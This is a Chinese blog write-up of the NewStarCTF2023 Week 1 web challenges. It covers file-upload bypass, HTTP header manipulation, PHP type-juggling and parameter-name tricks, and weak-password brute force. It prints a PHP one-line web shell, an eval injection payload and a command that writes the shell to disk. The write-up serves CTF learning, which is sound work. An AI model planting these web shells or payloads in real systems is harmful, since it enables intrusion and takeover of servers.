# NewStarCTF2023-Week1-Web


# 写在前面

Web题目总共7题，截至10-1日晚本人做题情况为：

![image-20231002104444169](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002104444169.png)

题目还是比较基础的，RCE的PHP非法字符是真的没有接触过，这也是比较有收获的一点。最后一题其实压根没往弱口令的方向去想，以后涉及到登录的题目第一想法肯定得是弱口令。

# 泄露的秘密

这题我压根没扫dir，试了一下www.zip结果就直接出来了。
![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105427736.png)

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105325895.png)

一个是robot.txt一个是index.php

结果为：flag{r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous}

## Begin of Upload

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105646430.png)

显然是需要上传马的。这里一定要看下前端有没有拦截：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105726833.png)

发现有限制拓展名，那这里就先改名Jpg上传。暂时不知道后端有没有拦截，因此先试试直接改包

```php
<?php @eval($_POST['cmd']); ?>
```

将一句话木马保存为shell.jpg上传，抓包：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110204238.png)

直接将后缀改为php，发现上传成功：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110248283.png)

直接蚁剑连接就可拿到flag：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110459278.png)

# Begin of HTTP

发现是闯关类的

第一个GET传参很简单：![image-20231002110740716](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110740716.png)

?ctf=1即可

第二关POST传参，发现secert在源码里：

![image-20231002110822640](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110822640.png)

```html
<!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) -->
```

解码后得：n3wst4rCTF2023g00000d

使用hackbar或者抓包传参即可：

![](C:\Users\alext\AppData\Roaming\Typora\typora-user-images\image-20231002111012082.png)

第三关：

![image-20231002111124389](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111124389.png)显然是改文请求头，发现power在cookie中，直接改即可：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111159424.png)

第四关：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111226081.png)

和浏览器信息相关的请求头是User-Agent，直接改为NewStarCTF2023即可（不要加浏览器！）

![image-20231002111325615](C:\Users\alext\AppData\Roaming\Typora\typora-user-images\image-20231002111325615.png)

第五关：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111348681.png)

从何处来？改Referer即可。

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111449345.png)

最后一个关：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111525058.png)

和本地访问有关的是：X-Forwarded-For或者X-Real-IP，发现是X-Real-IP，添加头为127.0.0.1发送即可：

![image-20231002111705008](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111705008.png)

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111720295.png)

# ErrorFlask

这里本来想的是命令注入这类的东西，但是试了几个不太行。回头看看Error，大概知道是报错的问题，于是直接搞点错误：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112621122.png)

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112659103.png)

发现是python，我们发现app.py是源文件，而且错误好像还可以展开的样子：打开来看看

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002112737977.png)

发现flag。

# Begin of PHP

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

if(isset($_GET['key1']) && isset($_GET['key2'])){
    echo "=Level 1=<br>";
    if($_GET['key1'] !== $_GET['key2'] && md5($_GET['key1']) == md5($_GET['key2'])){
        $flag1 = True;
    }else{
        die("nope,this is level 1");
    }
}

if($flag1){
    echo "=Level 2=<br>";
    if(isset($_POST['key3'])){
        if(md5($_POST['key3']) === sha1($_POST['key3'])){
            $flag2 = True;
        }
    }else{
        die("nope,this is level 2");
    }
}

if($flag2){
    echo "=Level 3=<br>";
    if(isset($_GET['key4'])){
        if(strcmp($_GET['key4'],file_get_contents("/flag")) == 0){
            $flag3 = True;
        }else{
            die("nope,this is level 3");
        }
    }
}

if($flag3){
    echo "=Level 4=<br>";
    if(isset($_GET['key5'])){
        if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){
            $flag4 = True;
        }else{
            die("nope,this is level 4");
        }
    }
}

if($flag4){
    echo "=Level 5=<br>";
    extract($_POST);
    foreach($_POST as $var){
        if(preg_match("/[a-zA-Z0-9]/",$var)){
            die("nope,this is level 5");
        }
    }
    if($flag5){
        echo file_get_contents("/flag");
    }else{
        die("nope,this is level 5");
    }
}
```

这么一大段代码：，总结下来有几个考点:

+ 绕过md5
+ 绕过sha1
+ 绕过strcmp
+ 绕过is_numeric
+ 绕过preg_match

我们一个个解决：

+ md5=md5，这种类型可以直接传入数组，因为md5(数组)=null，null=null
+ sha1同理。md5和sha1还可以使用0e绕过（得益于php的弱类型比较），具体参考：[PHP中sha1()函数和md5()函数的绕过_sha1绕过-CSDN博客](https://blog.csdn.net/weixin_46578840/article/details/119569862)。我这里使用的数组绕过，简单又快捷

+ strcmp(数组,anystring) ==0
+ is_numeric(字符串)==false，根据弱类型比较，'数字+字符' == 数字。
+ preg_match(任意规则，数组)=0，当然，由于flag5在源码中不存在，必须在POST中传入一个flag5。

综上，payload为

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002113844169.png)

![image-20231002113904490](C:\Users\alext\AppData\Roaming\Typora\typora-user-images\image-20231002113904490.png)

# R!C!E

题目够阴。

首先使用md5碰撞将password找出来，示例代码如下：

```python
import hashlib

def md5crack(pre,num,n):
    for i in range(0,num):
        print("[+]Check {} for {}.".format(i,pre))
        if (hashlib.md5(str(i).encode("UTF-8")).hexdigest()[0:n] == str(pre)):
            print("[+]{} correct!The md5 is {}.".format(i,hashlib.md5(str(i).encode("UTF-8")).hexdigest()))
            break
        else:
            print("[+]{} wrong!".format(i))

md5crack("c4d038",999999,6)
```

发现password=114514

下面，我们发现直接POST传e_v.a.l不会接收到任何数据，原因是php会对非法字符进行过滤，并将其修改为__（下划线）。但是该操作只会进行一次。（神奇的脑回路）非法字符如下：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002114225930.png)

于是为了让e_v.a.l中的.不被替换，我们将其中的下划线改为非法字符(])，然后让其变化一次阻止其继续变化。

```
password=114514&e[v.a.l=phpinfo();
```

成功了：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002114547184.png)

这里发现没有屏蔽fputs，直接写入木马，然后上蚁剑：

```php
fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd]);?>');
```

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002115040330.png)

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002115109139.png)

# Easy Login

以后碰到用户名密码一定先弱口令爆破！！！

![](C:\Users\alext\AppData\Roaming\Typora\typora-user-images\image-20231003104724610.png)

这里payload使用弱密码字典，但是记得使用md5加密。

爆破结果如下，找到字节数和其他的结果不同的结果就是答案：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105048454.png)

答案就是670b14728ad9902aecba32e22fa4f6bd（解密后是000000）。

这里登录后，在终端中CTRL-D退出终端，寻找历史记录，提示使用BurpSuite。

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105231688.png)

于是使用burpsuite。直接抓包发现没有什么信息。但是http请求记录里面有一个可疑点：

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105340181.png)

进去查看返回包就发现flag。

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231003105414680.png)

Web完结。


---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/10/newstarctf2023-week1-web/  

